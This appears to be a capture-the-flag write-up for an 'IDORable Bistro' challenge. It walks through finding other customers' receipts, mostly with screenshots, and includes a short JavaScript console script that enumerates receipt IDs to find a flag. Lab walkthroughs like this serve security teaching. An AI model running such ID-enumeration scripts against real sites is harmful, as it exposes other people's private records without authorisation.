IDORable Bistro

Difficulty: 2/5

Objective: 
Josh has a tasty IDOR treat for you—stop by Sasabune for a bite of vulnerability. What is the name of the gnome?

Task: 

<img width="924" height="765" alt="image" src="https://github.com/user-attachments/assets/c477c556-6b52-457d-a5fa-83086ec439a3" />

<img width="1281" height="677" alt="image" src="https://github.com/user-attachments/assets/fd067826-af15-4418-8b5c-e8bab5444c67" />

<img width="717" height="306" alt="image" src="https://github.com/user-attachments/assets/2f6cb360-cb82-4a47-abff-42d67d7ce744" />

<img width="405" height="909" alt="image" src="https://github.com/user-attachments/assets/9dbd3c91-e5e2-4096-88a0-5908463d155c" />

Scan the QR code with your phone.. ?

<img width="1159" height="856" alt="image" src="https://github.com/user-attachments/assets/f8405605-a32f-4b23-99cf-18122f6fe396" />

Open the link from the phone on computer

<img width="863" height="927" alt="image" src="https://github.com/user-attachments/assets/38a17058-9ffc-483a-a2e9-0ea1cec94209" />

View page source

<img width="1228" height="863" alt="image" src="https://github.com/user-attachments/assets/db87ae91-ca08-4984-825c-e4aea1453bb9" />

In console try to search for a new numbers

<img width="1275" height="756" alt="image" src="https://github.com/user-attachments/assets/a982fd9f-6aaf-40b7-8e4e-c358e451c1f0" />

<img width="1261" height="553" alt="image" src="https://github.com/user-attachments/assets/f7ae13b6-cf55-4783-a1f6-b153504b4346" />

In Network tab check other reciepts

<img width="1288" height="604" alt="image" src="https://github.com/user-attachments/assets/d0f02bba-0396-4736-98e5-7b8a0d1a20a8" />

Also can check this way too 

<img width="1889" height="877" alt="image" src="https://github.com/user-attachments/assets/424d1227-0f03-4e6b-b598-0351da928de1" />

So close? 

<img width="1374" height="849" alt="image" src="https://github.com/user-attachments/assets/c066d60b-2685-4932-8c1a-1e1249a63c5f" />


Trying new script in console:

```
async function checkReceipts(start, end) {
    for (let id = start; id <= end; id++) {
        try {
            const res = await fetch(`/receipt?id=${id}`);
            if (!res.ok) continue;

            const html = await res.text();
            if (html.includes("FLAG:")) {
                const match = html.match(/FLAG:\s*(https?:\/\/\S+)/i);
                if (match) {
                    console.log(`🎯 ID ${id} -> Found Flag URL: ${match[1]}`);
                } else {
                    console.log(`🔍 ID ${id} contains FLAG but no URL match.`);
                }
                break;
            }
        } catch (e) {
            console.warn(`Receipt ${id} error`, e);
        }
        await new Promise(r => setTimeout(r, 300)); // to avoid rate limiting
    }
}

checkReceipts(100, 150);
```

Finally found the answer: 

<img width="1710" height="692" alt="image" src="https://github.com/user-attachments/assets/79ce4950-8d5e-4507-9fa7-ed9161507a4a" />

This was based on the dialogue from earlier

<img width="998" height="312" alt="image" src="https://github.com/user-attachments/assets/52f74114-79fe-4bd9-bd3c-546bfb25d71c" />

Then i just searched the receipts to see who order frozen sushi and also the name looked a bit strange.




